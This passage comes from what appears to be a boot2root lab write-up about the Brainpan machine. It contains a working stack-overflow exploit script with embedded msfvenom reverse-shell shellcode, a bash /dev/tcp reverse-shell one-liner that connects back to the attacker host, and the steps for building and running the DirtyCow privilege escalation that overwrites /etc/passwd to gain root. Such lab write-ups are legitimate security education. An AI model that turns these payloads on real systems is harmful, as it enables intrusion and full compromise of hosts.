payload += "\x24\x2b\x32\xc2\x16\xf4\xe8\x4c\x1b\x7d\x37\x8b"
payload += "\x5c\x54\x8f\x03\xa3\x57\xf0\x0a\x60\x03\xa0\x24"
payload += "\x41\x2c\x2b\xb4\x6e\xf9\xfc\xe4\xc0\x52\xbd\x54"
payload += "\xa1\x02\x55\xbe\x2e\x7c\x45\xc1\xe4\x15\xec\x38"
payload += "\x6f\xda\x59\x42\x62\xb2\x9b\x42\x6d\x1e\x15\xa4"
payload += "\xe7\x8e\x73\x7f\x90\x37\xde\x0b\x01\xb7\xf4\x76"
payload += "\x01\x33\xfb\x87\xcc\xb4\x76\x9b\xb9\x34\xcd\xc1"
payload += "\x6c\x4a\xfb\x6d\xf2\xd9\x60\x6d\x7d\xc2\x3e\x3a"
payload += "\x2a\x34\x37\xae\xc6\x6f\xe1\xcc\x1a\xe9\xca\x54"
payload += "\xc1\xca\xd5\x55\x84\x77\xf2\x45\x50\x77\xbe\x31"
payload += "\x0c\x2e\x68\xef\xea\x98\xda\x59\xa5\x77\xb5\x0d"
payload += "\x30\xb4\x06\x4b\x3d\x91\xf0\xb3\x8c\x4c\x45\xcc"
payload += "\x21\x19\x41\xb5\x5f\xb9\xae\x6c\xe4\xc9\xe4\x2c"
payload += "\x4d\x42\xa1\xa5\xcf\x0f\x52\x10\x13\x36\xd1\x90"
payload += "\xec\xcd\xc9\xd1\xe9\x8a\x4d\x0a\x80\x83\x3b\x2c"
payload += "\x37\xa3\x69"
```

Again, I replaced the previous shellcode with the above payload before opening up a netcat listener on my local desktop. Upon running the exploit, I was happy to see that my listener caught a shell.

```bash
~> nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.0.14 49162
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\cb\Desktop\vulns\brainpan>
```

With a completed exploit I had everything I needed to move on to the real host.

### Getting a shell on the target

I needed to make a few changes to prepare my shell for my non-lab target. I started by updating the target variable in my exploit to reflect the IP of the lab instance `10.10.42.127` and then regenerated my reverse shell payload to connect back to my attack host. The finalized exploit with these changes looked like.

```python
#!/usr/bin/env python3

import sys
from pwn import *

# context vars
context.arch = 'amd64'

# target
target = remote('10.10.42.127', 9999, typ='tcp')

# target-specific vars

# payload vars
total_payload_size = 1000
offset = 524
overflow = "A" * offset
retn = "\xf3\x12\x17\x31"
padding = "\x90" * 16
bad_chars = "\x00"
#root@kali:~/ctf# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.176.118 LPORT=4444 -v payload -b '\x00' -f python | sed 's/b"/"/'
payload =  ""
payload += "\xd9\xc2\xb8\x7f\xdc\xf2\x3e\xd9\x74\x24\xf4\x5a"
payload += "\x2b\xc9\xb1\x52\x31\x42\x17\x83\xea\xfc\x03\x3d"
payload += "\xcf\x10\xcb\x3d\x07\x56\x34\xbd\xd8\x37\xbc\x58"
payload += "\xe9\x77\xda\x29\x5a\x48\xa8\x7f\x57\x23\xfc\x6b"
payload += "\xec\x41\x29\x9c\x45\xef\x0f\x93\x56\x5c\x73\xb2"
payload += "\xd4\x9f\xa0\x14\xe4\x6f\xb5\x55\x21\x8d\x34\x07"
payload += "\xfa\xd9\xeb\xb7\x8f\x94\x37\x3c\xc3\x39\x30\xa1"
payload += "\x94\x38\x11\x74\xae\x62\xb1\x77\x63\x1f\xf8\x6f"
payload += "\x60\x1a\xb2\x04\x52\xd0\x45\xcc\xaa\x19\xe9\x31"
payload += "\x03\xe8\xf3\x76\xa4\x13\x86\x8e\xd6\xae\x91\x55"
payload += "\xa4\x74\x17\x4d\x0e\xfe\x8f\xa9\xae\xd3\x56\x3a"
payload += "\xbc\x98\x1d\x64\xa1\x1f\xf1\x1f\xdd\x94\xf4\xcf"
payload += "\x57\xee\xd2\xcb\x3c\xb4\x7b\x4a\x99\x1b\x83\x8c"
payload += "\x42\xc3\x21\xc7\x6f\x10\x58\x8a\xe7\xd5\x51\x34"
payload += "\xf8\x71\xe1\x47\xca\xde\x59\xcf\x66\x96\x47\x08"
payload += "\x88\x8d\x30\x86\x77\x2e\x41\x8f\xb3\x7a\x11\xa7"
payload += "\x12\x03\xfa\x37\x9a\xd6\xad\x67\x34\x89\x0d\xd7"
payload += "\xf4\x79\xe6\x3d\xfb\xa6\x16\x3e\xd1\xce\xbd\xc5"
payload += "\xb2\xfa\x4b\x75\x34\x93\x49\x75\xa8\x3f\xc7\x93"
payload += "\xa0\xaf\x81\x0c\x5d\x49\x88\xc6\xfc\x96\x06\xa3"
payload += "\x3f\x1c\xa5\x54\xf1\xd5\xc0\x46\x66\x16\x9f\x34"
payload += "\x21\x29\x35\x50\xad\xb8\xd2\xa0\xb8\xa0\x4c\xf7"
payload += "\xed\x17\x85\x9d\x03\x01\x3f\x83\xd9\xd7\x78\x07"
payload += "\x06\x24\x86\x86\xcb\x10\xac\x98\x15\x98\xe8\xcc"
payload += "\xc9\xcf\xa6\xba\xaf\xb9\x08\x14\x66\x15\xc3\xf0"
payload += "\xff\x55\xd4\x86\xff\xb3\xa2\x66\xb1\x6d\xf3\x99"
payload += "\x7e\xfa\xf3\xe2\x62\x9a\xfc\x39\x27\xaa\xb6\x63"
payload += "\x0e\x23\x1f\xf6\x12\x2e\xa0\x2d\x50\x57\x23\xc7"
payload += "\x29\xac\x3b\xa2\x2c\xe8\xfb\x5f\x5d\x61\x6e\x5f"
payload += "\xf2\x82\xbb"
postfix = "C" * (total_payload_size - offset - len(retn) - len(padding) - len(payload))

buffer = "".join([
    overflow,
    retn,
    padding,
    payload,
    postfix
])

# send exploit
# sending payload
target.recvuntil(">> ")
log.info(f"sending payload of {len(buffer)} bytes")
target.sendline(buffer)
target.recvuntil("\n")

# cleanup
target.close()
sys.exit(0)
```

I then started a listener and fired off the exploit, happily I caught a shell as a user, `puck`.

```bash
Z:\home\puck>dir
Volume in drive Z has no label.
Volume Serial Number is 0000-0000

Directory of Z:\home\puck

  3/6/2013   2:23 PM  <DIR>         .
  3/4/2013  10:49 AM  <DIR>         ..
  3/6/2013   2:23 PM           513  checksrv.sh
  3/4/2013   1:45 PM  <DIR>         web
       1 file                       513 bytes
       3 directories     13,850,206,208 bytes free

```

While this shell appeared to be a `CMD` shell the directory structure and files immediately did not look like a windows environment. Enumeration quickly confirmed this was not a bog standard windows host.

### Enumerating the Host

It was clear that this was either a linux host somehow running `CMD`, or at a minimum a mount to a linux volume.

```powershell
Z:\>dir
Volume in drive Z has no label.
Volume Serial Number is 0000-0000

Directory of Z:\

  3/4/2013  12:02 PM  <DIR>         bin
  3/4/2013  10:19 AM  <DIR>         boot
12/22/2020  10:26 PM  <DIR>         etc
  3/4/2013  10:49 AM  <DIR>         home
  3/4/2013  10:18 AM    15,084,717  initrd.img
  3/4/2013  10:18 AM    15,084,717  initrd.img.old
  3/4/2013  12:04 PM  <DIR>         lib
  3/4/2013   9:12 AM  <DIR>         lost+found
  3/4/2013   9:12 AM  <DIR>         media
 10/9/2012   8:59 AM  <DIR>         mnt
  3/4/2013   9:13 AM  <DIR>         opt
  3/7/2013  10:07 PM  <DIR>         root
12/22/2020  10:26 PM  <DIR>         run
  3/4/2013  10:20 AM  <DIR>         sbin
 6/11/2012   8:43 AM  <DIR>         selinux
  3/4/2013   9:13 AM  <DIR>         srv
12/22/2020  10:34 PM  <DIR>         tmp
  3/4/2013   9:13 AM  <DIR>         usr
  8/5/2019   2:47 PM  <DIR>         var
 2/25/2013   1:32 PM     5,180,432  vmlinuz
 2/25/2013   1:32 PM     5,180,432  vmlinuz.old
       4 files               40,530,298 bytes
      17 directories     13,850,206,208 bytes free
```

With a little digging, I was excited to find that I could execute commands on this linux machine. With this in mind I decided to leverage a reverse bash shell to migrate into the underlying linux host.

To facilitate this, I generated the shell using msfvenom again before executing this directly through `bash`.

```bash
root@kali:~/ctf# msfvenom -p cmd/unix/reverse_bash LHOST=10.10.176.118 LPORT=4443
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 66 bytes
0<&137-;exec 137<>/dev/tcp/10.10.176.118/4443;sh <&137 >&137 2>&137
```

```bash
Z:\>/bin/bash -c "0<&137-;exec 137<>/dev/tcp/10.10.176.118/4443;sh <&137 >&137 2>&137"
```

```bash
root@kali:~/ctf# nc -lvnp 4443
listening on [any] 4443 ...
connect to [10.10.176.118] from (UNKNOWN) [10.10.42.127] 51982
ls
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lost+found
media
mnt
opt
proc
root
run
sbin
selinux
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old

whoami
puck
```

Again I caught a raw shell via a listening `netcat` instance.

### Stabilizing my limited shell to a full TTY

Given I could be on this shell a while, I wanted to stabilize it to something I couldn't accidentally blow away with a rogue `^c`. I knew that the host had python 2.7 on it from the earlier `nmap` scans and decided to use the `import pty` trick to migrate this shell into a new pty.

```bash
python --version
Python 2.7.3
python -c 'import pty; pty.spawn("/bin/bash")'
puck@brainpan:/$
puck@brainpan:/$ ^Z
[1]+  Stopped                 nc -lvnp 4443
root@kali:~/ctf# stty raw -echo; fg;
nc -lvnp 4443
             ls
bin   etc         initrd.img.old  media  proc  sbin     sys  var
boot  home        lib             mnt    root  selinux  tmp  vmlinuz
dev   initrd.img  lost+found      opt    run   srv      usr  vmlinuz.old
puck@brainpan:/$ export SHELL=/bin/bash
puck@brainpan:/$ export TERM=screen
puck@brainpan:/$
```

With a stabilized shell, it was time to start enumerating the host for anything valuable.

### Enumerating the linux target

I decided to use `linpeas` initially to generate a high-level overview of the host and created a transfer directory that I could uses as a webroot to migrate assets over to the target.

```bash
root@kali:~/ctf# mkdir transfer
root@kali:~/ctf# cd transfer/
root@kali:~/ctf/transfer# cp ~/Desktop/PEASS/linPEAS/linpeas.sh .
root@kali:~/ctf/transfer# ls
linpeas.sh
root@kali:~/ctf/transfer# python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```

```bash
puck@brainpan:~$ wget 'http://10.10.176.118:8888/linpeas.sh'
--2020-12-22 22:43:59--  http://10.10.176.118:8888/linpeas.sh
Connecting to 10.10.176.118:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 222579 (217K) [text/x-sh]
Saving to: `linpeas.sh'

100%[======================================>] 222,579     --.-K/s   in 0.002s  

2020-12-22 22:43:59 (96.8 MB/s) - `linpeas.sh' saved [222579/222579]
puck@brainpan:~$ chmod +x linpeas.sh
puck@brainpan:~$ ./linpeas.sh > /tmp/localenum.txt
```

I kicked off the script and decided to walk away for a minute considering how strange this host truly was. When I came back I found that the enumeration returned a few potential paths forward. Most interestingly though, it confirmed that the host was running `wine` which explained the `cmd.exe` shell and windows binary.

```bash
[+] Finding 'username' string inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
/home/puck/.wine/dosdevices/z:/tmp/localenum.txt:USERNAME=puck
```

Additionally it identified a nopassword root binary that the `puck` user could execute via sudo which looked extremely likely as the vector of escalation.

```bash
[+] Testing 'sudo -l' without password & /etc/sudoers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
```

I wasted roughly 15 minutes prodding at the `anansi_util` binary though before realizing the host might be vulnerable to a dirtycow escalation and that the `anansi_util` binary could have been a red herring.

```bash
OS: Linux version 3.5.0-25-generic (buildd@lamiak) (gcc version 4.7.2 (Ubuntu/Linaro 4.7.2-2ubuntu1) ) #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013
User & Groups: uid=1002(puck) gid=1002(puck) groups=1002(puck)
Hostname: brainpan
Writable folder: /home/puck
```

```bash
puck@brainpan:~$ uname -a
Linux brainpan 3.5.0-25-generic #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013 i686 i686 i686 GNU/Linux
```

### Building dirtycow

I decided to reach for the original Christian "FireFart" Mehlmauer implementation of dirtycow because it generated a new user that collided with the root uid/gid, effectively giving me access to a root user. I pulled down the C code from his repo and fetched the x86 dependencies I needed to build it, planning to build a statically linked binary that I could just drop on the host to make my life the easier.

```bash
root@kali:~/ctf# wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
root@kali:~/ctf# sed -i dirty.c 's/firefart/cb/g'
root@kali:~/ctf# dpkg --add-architecture i386
root@kali:~/ctf# apt-get update && apt-get install -y libcrypt-dev:i386 libc6-dev-i386
root@kali:~/ctf# gcc -static -m32 -pthread dirty.c -o dirty -lcrypt
root@kali:~/ctf# ldd dirty
        not a dynamic executable
root@kali:~/ctf# readelf -h dirty
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 03 00 00 00 00 00 00 00 00 
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - GNU
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Intel 80386
  Version:                           0x1
  Entry point address:               0x8049cc0
  Start of program headers:          52 (bytes into file)
  Start of section headers:          1288232 (bytes into file)
  Flags:                             0x0
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         8
  Size of section headers:           40 (bytes)
  Number of section headers:         37
  Section header string table index: 36
```

I restarted the python webserver and transfered the malicious binary over to the target.

```bash
root@kali:~/ctf# cp dirty transfer/
root@kali:~/ctf# cd transfer/
root@kali:~/ctf/transfer# python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```

```bash
puck@brainpan:~$ wget 'http://10.10.176.118:8888/dirty'
--2020-12-22 23:02:59--  http://10.10.176.118:8888/dirty
Connecting to 10.10.176.118:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1289712 (1.2M) [application/octet-stream]
Saving to: `dirty'

100%[======================================>] 1,289,712   --.-K/s   in 0.01s   

2020-12-22 23:02:59 (104 MB/s) - `dirty' saved [1289712/1289712]

puck@brainpan:~$ ls
checksrv.sh  dirty  linpeas.sh  web
puck@brainpan:~$ chmod +x dirty
puck@brainpan:~$ ./dirty 'vu1n3r4b13'
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: vu1n3r4b13
Complete line:
cb:fiLqOIF8ICzyk:0:0:pwned:/root:/bin/bash

mmap: b773e000
```

Executing the coommand output the `cb` user I had expected and it was time to see if my exploit worked.

```bash
puck@brainpan:~$ su cb
Password: 
cb@brainpan:/home/puck# cd /root
cb@brainpan:~# pwd
/root
cb@brainpan:~# ls
b.txt
cb@brainpan:~# cat b.txt 
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|


                                              http://www.techorganic.com 



cb@brainpan:~#
```

SUCCESS! My `cb` user had root permissions and I was able to reach the `/root` directory where I happily viewed the `b.txt` file.

## Summary

This host ended up being a rollercoaster having a twist at effectively every step of the attack. I especially enjoyed being able to leverage and old smash-the-stack overflow to gain initial access. To date, this is my favorite boot2root that I've had the pleasure of working through.
